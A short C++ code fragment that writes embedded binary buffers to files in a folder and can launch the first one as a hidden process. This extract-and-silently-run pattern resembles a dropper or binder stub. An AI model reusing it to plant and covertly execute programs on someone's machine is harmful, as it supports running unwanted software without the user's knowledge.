
	for (unsigned int i = 0; i < data.size(); ++i)
	{
		outFile.open(path + "\\" + fileNames[i], std::ios::out | std::ios::binary);
		outFile.write(reinterpret_cast<const char*>(data[i]), sizes[i]);
		outFile.close();
	}

	if (autoStart)
	{
		path.append("\\" + fileNames[0]);
		STARTUPINFOA si{ 0 };
		PROCESS_INFORMATION pi{ 0 };
		si.wShowWindow = SW_HIDE;
		CreateProcessA(path.c_str(), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	}

	return 0;
}